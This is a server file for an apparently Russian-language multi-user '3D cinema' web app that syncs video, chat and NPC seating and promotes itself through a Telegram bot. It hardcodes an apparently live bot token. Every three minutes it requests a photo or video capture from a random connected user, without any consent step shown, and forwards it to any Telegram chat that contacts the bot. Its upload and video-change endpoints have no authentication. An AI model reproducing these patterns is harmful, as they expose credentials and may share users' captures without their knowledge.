const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// --- НАСТРОЙКИ ЗАЛА И NPC ---
const TOTAL_SEATS = 12;
const MAX_NPC_COUNT = 9; // Баланс 12 мест: 9 NPC + 3 для реальных игроков
let players = {};
let npcs = {};

let videoState = {
    url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    startTime: Date.now(),
    isStreamMode: false
};

let activeChatIds = new Set(['-1004486534339']);

// --- TELEGRAM BOT ---
const BOT_TOKEN = '8909586840:AAGmOGefqetTN-cFZrxQSkgYtn-bDAv_RvU';
const WEB_APP_URL = 'https://prostocvas.onrender.com/';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.on('message', (msg) => {
    if (msg.chat && msg.chat.id) {
        activeChatIds.add(msg.chat.id.toString());
    }
});

// Запрос скриншота/видео у любого подключенного клиента
function sendMediaRequest() {
    const socketIds = Object.keys(players);
    if (socketIds.length > 0) {
        const isVideo = Math.random() < 0.5; // 50/50 выбор
        const targetSocket = socketIds[Math.floor(Math.random() * socketIds.length)];
        io.to(targetSocket).emit('requestCapture', { type: isVideo ? 'video' : 'photo' });
    } else {
        activeChatIds.forEach(chatId => {
            bot.sendMessage(chatId, "🎬 В кинотеатре идет показ! Заходи скорее смотреть!", {
                reply_markup: {
                    inline_keyboard: [[{ text: "🍿 Войти в 3D Кинотеатр", url: WEB_APP_URL }]]
                }
            }).catch(err => console.error(err.message));
        });
    }
}

// Прием медиа из клиента и отправка в ТГ
app.post('/api/media', (req, res) => {
    const { type, data } = req.body;
    if (!data) return res.status(400).send("No data");

    const base64Data = data.replace(/^data:(image\/png|video\/webm);base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');

    activeChatIds.forEach(chatId => {
        if (type === 'photo') {
            bot.sendPhoto(chatId, buffer, {
                caption: "📸 Ракурс из зала прямо сейчас!",
                reply_markup: { inline_keyboard: [[{ text: "🎬 Смотреть вместе", url: WEB_APP_URL }]] }
            }).catch(err => console.error(err.message));
        } else if (type === 'video') {
            bot.sendVideo(chatId, buffer, {
                caption: "🎥 Видео-обзор из кинотеатра!",
                reply_markup: { inline_keyboard: [[{ text: "🎬 Смотреть вместе", url: WEB_APP_URL }]] }
            }).catch(err => console.error(err.message));
        }
    });

    res.send({ success: true });
});

// Каждые 3 минуты (180000 ms)
setInterval(sendMediaRequest, 180000);

// --- СМЕНА NPC КАЖДЫЕ 3-5 МИНУТ ---
function rotateNPCs() {
    io.emit('rotateNPC');
}
setInterval(rotateNPCs, (Math.floor(Math.random() * 2) + 3) * 60000);

// --- SOCKET.IO ---
io.on('connection', (socket) => {
    socket.on('join', (data) => {
        players[socket.id] = {
            id: socket.id,
            nickname: data.nickname || `Зритель`,
            seatIndex: Math.floor(Math.random() * TOTAL_SEATS)
        };

        const currentTime = (Date.now() - videoState.startTime) / 1000;
        socket.emit('init', {
            id: socket.id,
            players,
            videoState: { ...videoState, currentTime }
        });

        socket.broadcast.emit('playerJoined', players[socket.id]);
    });

    socket.on('chatMessage', (msg) => {
        if (players[socket.id]) {
            io.emit('chatMessage', {
                id: socket.id,
                nickname: players[socket.id].nickname,
                text: msg
            });
        }
    });

    socket.on('changeVideo', (input) => {
        videoState = {
            url: input,
            startTime: Date.now(),
            isStreamMode: false
        };
        io.emit('videoStateUpdate', { ...videoState, currentTime: 0 });
    });

    socket.on('disconnect', () => {
        delete players[socket.id];
        io.emit('playerLeft', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
